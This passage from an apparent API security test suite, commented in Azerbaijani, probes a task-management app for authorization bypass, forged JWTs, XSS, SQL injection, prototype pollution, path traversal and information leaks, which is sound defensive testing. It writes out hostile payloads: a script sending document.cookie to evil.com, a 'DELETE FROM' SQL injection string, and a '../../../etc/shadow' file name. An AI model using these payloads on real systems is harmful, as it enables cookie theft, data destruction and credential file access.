  // 9.10 — Referrer header manipulation
  test('Referrer header manipulation', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      headers: {
        ...authHeader(adminToken),
        Referer: 'https://evil.com/steal-data',
      },
    })
    assertNotServerError(res.status, 'Referrer manipulation')
    expect(res.status).toBe(200)
  })

  // 9.11 — Concurrent template creation race condition
  test('Race condition: eyni anda 10 template yaratma', async () => {
    const promises = Array.from({ length: 10 }, (_, i) =>
      fetch(`${BASE}/templates`, {
        method: 'POST',
        headers: authHeader(adminToken),
        body: JSON.stringify({
          name: `Race Template ${i}`,
          scheduleType: 'DAILY',
          items: [{ title: `race item ${i}` }],
        }),
      }).then(async r => {
        const data = await r.json().catch(() => null)
        return { status: r.status, data }
      })
    )

    const results = await Promise.all(promises)
    const created = results.filter(r => r.status === 201 || r.status === 200)
    const errors = results.filter(r => r.status === 500)

    if (errors.length > 0) {
      console.warn(`🔴 Race condition: ${errors.length}/10 template 500 qaytardı!`)
    }

    // Təmizlik
    for (const r of created) {
      if (r.data?.id) {
        await fetch(`${BASE}/templates/${r.data.id}`, {
          method: 'DELETE',
          headers: authHeader(adminToken),
        })
      }
    }

    expect(errors.length).toBe(0)
  }, 30000)

  // 9.12 — Mövcud olmayan endpoint-ə giriş
  test('Mövcud olmayan endpoint 404 qaytarmalıdır (server info sızdırmamalı)', async () => {
    const res = await fetch(`${BASE}/admin/secret-panel`, {
      headers: authHeader(adminToken),
    })
    assertNotServerError(res.status, 'Non-existent endpoint')
    expect(res.status).toBe(404)

    // Cavabda server texnologiyası sızdırılmamalıdır
    const body = await res.text()
    const leaksInfo = body.includes('NestJS') || body.includes('Express') || body.includes('node_modules')
    if (leaksInfo) {
      console.warn('⚠️  Server texnologiya məlumatı sızdırır 404 cavabında')
    }
  })

  // 9.13 — OPTIONS sorğusu (CORS preflight)
  test('OPTIONS preflight sorğusu düzgün cavab verməlidir', async () => {
    const res = await fetch(`${BASE}/tasks`, {
      method: 'OPTIONS',
      headers: {
        Origin: 'http://localhost:3000',
        'Access-Control-Request-Method': 'POST',
        'Access-Control-Request-Headers': 'Authorization, Content-Type',
      },
    })
    // CORS preflight 204 və ya 200 olmalıdır
    assertNotServerError(res.status, 'OPTIONS preflight')
    expect([200, 204]).toContain(res.status)
  })

  // 9.14 — JWT payload manipulation (tenantId dəyişdirmə cəhdi)
  test('JWT payload-da tenantId manual dəyişdirmə — rədd edilməlidir', async () => {
    // Admin token-inin payload-ını decode edib tenantId-ni dəyişdirə bilmərik
    // çünki signature yoxlanır. Amma yoxlayaq ki, server düzgün yoxlayır.
    const parts = adminToken.split('.')
    if (parts.length === 3) {
      const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString())
      // tenantId-ni dəyişdir
      payload.tenantId = '00000000-0000-0000-0000-999999999999'
      const newPayload = Buffer.from(JSON.stringify(payload)).toString('base64url')
      const forgedToken = `${parts[0]}.${newPayload}.${parts[2]}`

      const res = await fetch(`${BASE}/tasks`, {
        headers: { Authorization: `Bearer ${forgedToken}` },
      })
      // Signature match etməyəcəyi üçün 401 gözləyirik
      assertNotServerError(res.status, 'Forged tenantId JWT')
      expect(res.status).toBe(401)
    }
  })
})

// ═════════════════════════════════════════════════════════════════════════════
// 10. TODO (TODOIST) SİSTEMİ SPESİFİK HÜCUMLAR
// ═════════════════════════════════════════════════════════════════════════════

describe('10. TODO (TODOIST) SİSTEMİ SPESİFİK HÜCUMLAR', () => {

  // 10.1 — Başqasının Todoist layihəsini silmə cəhdi
  test('Başqasının Todoist layihəsini silə bilməməlidir', async () => {
    // Admin layihə yaratsın
    const createRes = await fetch(`${BASE}/todoist/projects`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({ name: 'Admin Secret Project', color: 'RED' }),
    })
    const project = await createRes.json()

    if (project.id) {
      // İşçi silməyə çalışsın
      const delRes = await fetch(`${BASE}/todoist/projects/${project.id}`, {
        method: 'DELETE',
        headers: authHeader(employeeToken),
      })
      assertNotServerError(delRes.status, 'Employee deleting admin todoist project')
      if (delRes.status === 200) {
        console.warn('🔴 BUG: İşçi admin-in Todoist layihəsini silə bildi!')
      }
      expect([403, 404]).toContain(delRes.status)

      // Təmizlik
      await fetch(`${BASE}/todoist/projects/${project.id}`, {
        method: 'DELETE',
        headers: authHeader(adminToken),
      })
    }
  })

  // 10.2 — Başqasının Todoist tapşırığını tamamlama cəhdi
  test('Başqasının Todoist tapşırığını tamamlaya bilməməlidir', async () => {
    // Əvvəlcə layihə, sonra tapşırıq yarat
    const projRes = await fetch(`${BASE}/todoist/projects`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({ name: 'Temp Project for Complete Test' }),
    })
    const proj = await projRes.json()

    if (proj.id) {
      const taskRes = await fetch(`${BASE}/todoist/tasks`, {
        method: 'POST',
        headers: authHeader(adminToken),
        body: JSON.stringify({
          content: 'Admin-in gizli tapşırığı',
          projectId: proj.id,
          priority: 1,
        }),
      })
      const task = await taskRes.json()

      if (task.id) {
        // İşçi tamamlamağa çalışsın
        const completeRes = await fetch(`${BASE}/todoist/tasks/${task.id}/complete`, {
          method: 'POST',
          headers: authHeader(employeeToken),
        })
        assertNotServerError(completeRes.status, 'Employee completing admin todoist task')
        if (completeRes.status === 200) {
          console.warn('⚠️  İşçi admin-in Todoist tapşırığını tamamlaya bildi — ownership yoxlaması yoxdur')
        }

        // Təmizlik
        await fetch(`${BASE}/todoist/tasks/${task.id}`, {
          method: 'DELETE',
          headers: authHeader(adminToken),
        })
      }

      await fetch(`${BASE}/todoist/projects/${proj.id}`, {
        method: 'DELETE',
        headers: authHeader(adminToken),
      })
    }
  })

  // 10.3 — Todoist label injection
  test('Todoist label XSS adı ilə yaradılmamalıdır', async () => {
    const res = await fetch(`${BASE}/todoist/labels`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        name: '<img src=x onerror=alert("XSS")>',
        color: 'RED',
      }),
    })
    assertNotServerError(res.status, 'XSS in label name')
    if (res.ok) {
      const label = await res.json()
      if (label.name && label.name.includes('onerror')) {
        console.warn('⚠️  Stored XSS: Label adında HTML saxlanır')
      }
      // Təmizlik
      if (label.id) {
        await fetch(`${BASE}/todoist/labels/${label.id}`, {
          method: 'DELETE',
          headers: authHeader(adminToken),
        })
      }
    }
  })

  // 10.4 — Todoist reorder əməliyyatı: başqasının tapşırıqları
  test('Todoist reorder: olmayan tapşırıq ID-ləri ilə', async () => {
    const res = await fetch(`${BASE}/todoist/tasks/reorder`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        items: Array.from({ length: 100 }, (_, i) => ({
          id: `00000000-0000-0000-0000-${String(i).padStart(12, '0')}`,
          sortOrder: i,
        })),
      }),
    })
    assertNotServerError(res.status, 'Reorder 100 fake task IDs')
  })

  // 10.5 — Todoist comment injection
  test('Todoist comment: XSS və SQL injection', async () => {
    // Fake task ID ilə comment yaratma cəhdi
    const xssComment = await fetch(`${BASE}/todoist/tasks/fake-id/comments`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        content: '<script>fetch("http://evil.com/steal?c="+document.cookie)</script>',
      }),
    })
    assertNotServerError(xssComment.status, 'XSS in todoist comment')

    const sqlComment = await fetch(`${BASE}/todoist/tasks/fake-id/comments`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        content: "'; DELETE FROM \"TodoistComment\"; --",
      }),
    })
    assertNotServerError(sqlComment.status, 'SQL injection in todoist comment')
  })

  // 10.6 — Todoist template: zərərli tasks JSON
  test('Todoist template: zərərli JSON tasks sahəsində', async () => {
    const res = await fetch(`${BASE}/todoist/templates`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        name: 'Malicious Template',
        tasks: '{"__proto__":{"isAdmin":true},"tasks":[]}',
      }),
    })
    assertNotServerError(res.status, 'Prototype pollution in template tasks')
    if (res.ok) {
      const data = await res.json()
      if (data.id) {
        await fetch(`${BASE}/todoist/templates/${data.id}`, {
          method: 'DELETE',
          headers: authHeader(adminToken),
        })
      }
    }
  })

  // 10.7 — Todoist attachment: path traversal
  test('Todoist attachment path traversal fayl adında', async () => {
    const formData = new FormData()
    formData.append('file', new Blob(['traversal test']), '../../../etc/shadow')

    const res = await fetch(`${BASE}/todoist/tasks/fake-id/attachments`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${adminToken}` },
      body: formData,
    })
    assertNotServerError(res.status, 'Path traversal todoist attachment')
  })
})

// ═════════════════════════════════════════════════════════════════════════════
// 11. ENUMERATION VƏ İNFORMASİYA SIZDIRMA
// ═════════════════════════════════════════════════════════════════════════════

describe('11. ENUMERATION VƏ İNFORMASİYA SIZDIRMA', () => {

  // 11.1 — Error message-lar istifadəçi adı sızdırır mı?
  test('Login xətası mesajı email mövcudluğunu sızdırmamalıdır', async () => {
    // Mövcud email ilə yanlış şifrə
    const res1 = await fetch(`${BASE}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'admin@techflow.az', password: 'wrongwrong' }),
    })
    const data1 = await res1.json()

    // Mövcud olmayan email
    const res2 = await fetch(`${BASE}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'nonexistent@nowhere.com', password: 'wrongwrong' }),
    })
    const data2 = await res2.json()

    // Eyni xəta mesajı olmalıdır — fərqlidirsə user enumeration mümkündür
    const msg1 = data1.message || ''
    const msg2 = data2.message || ''

    if (msg1 !== msg2) {
      console.warn(`⚠️  USER ENUMERATION: Mövcud email: "${msg1}" vs Olmayan email: "${msg2}"`)
    }
    // Hər ikisi 401 olmalıdır
    expect(res1.status).toBe(401)
    expect(res2.status).toBe(401)
  })

  // 11.2 — Server header-ləri texnologiya sızdırır mı?
  test('Response header-ları server texnologiyasını sızdırmamalıdır', async () => {
    const res = await fetch(`${BASE}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'admin@techflow.az', password: '123456' }),
    })

    const serverHeader = res.headers.get('server')
    const poweredBy = res.headers.get('x-powered-by')

    if (poweredBy) {
      console.warn(`⚠️  X-Powered-By header tapıldı: "${poweredBy}" — bu sızdırılmamalıdır`)
    }
    if (serverHeader && (serverHeader.includes('Express') || serverHeader.includes('NestJS'))) {
      console.warn(`⚠️  Server header texnologiya sızdırır: "${serverHeader}"`)
    }
  })

  // 11.3 — Stack trace sızdırma
  test('Error cavabı stack trace sızdırmamalıdır', async () => {
    // Qəsdən xəta yarad
    const res = await fetch(`${BASE}/tasks`, {
      method: 'POST',
      headers: authHeader(adminToken),
      body: JSON.stringify({
        title: 123, // string olmalıdır
        type: 'INVALID_TYPE',
      }),
    })
    const data = await res.json()

    const bodyStr = JSON.stringify(data)
    if (bodyStr.includes('node_modules') || bodyStr.includes('.ts:') || bodyStr.includes('at ')) {
      console.warn('🔴 Stack trace sızdırılır error cavabında!')
    }
  })

  // 11.4 — Database error sızdırma
  test('Prisma/Database xətaları client-ə sızdırılmamalıdır', async () => {
    // Etibarsız UUID göndər — Prisma xətası yaranmalıdır
    const res = await fetch(`${BASE}/tasks/not-a-uuid-at-all!!!`, {
      headers: authHeader(adminToken),
    })
    if (res.status === 500) {
      const data = await res.json()
      const bodyStr = JSON.stringify(data)
      if (bodyStr.includes('PrismaClient') || bodyStr.includes('prisma') || bodyStr.includes('P2025')) {
        console.warn('🔴 Prisma database error details sızdırılır client-ə!')
      }
    }
  })
})

// ═════════════════════════════════════════════════════════════════════════════
// 12. NƏTİCƏ HESABATI
// ═════════════════════════════════════════════════════════════════════════════

afterAll(() => {
  console.log('\n' + '='.repeat(70))
  console.log('  TƏHLÜKƏSİZLİK TESTLƏRİ TAMAMLANDI')
  console.log('='.repeat(70))
  console.log('  ⚠️  console.warn mesajlarını yoxlayın — hər biri potensial zəiflikdir')
  console.log('  🔴 500 qaytaran test = REAL BUG')
  console.log('  Tapılan zəifliklər yuxarıdakı warn mesajlarında göstərilib')
  console.log('='.repeat(70) + '\n')
})
